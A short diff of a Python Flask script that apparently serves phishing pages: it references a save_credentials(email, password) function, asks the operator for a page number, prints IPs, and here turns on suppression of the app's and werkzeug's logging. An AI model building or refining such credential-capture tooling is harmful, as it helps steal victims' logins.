@@ -60,9 +60,9 @@ def save_credentials(email, password):
         file.write('---------------------\n')
 
 if __name__ == '__main__':
-    #app.logger.disabled = True
-    #log = logging.getLogger('werkzeug')
-    #log.setLevel(logging.ERROR)
+    app.logger.disabled = True
+    alog = logging.getLogger('werkzeug')
+    alog.setLevel(logging.ERROR)
     page = input("Enter page number: ")
     print_ips()
     app.run(host='0.0.0.0', port=8080)
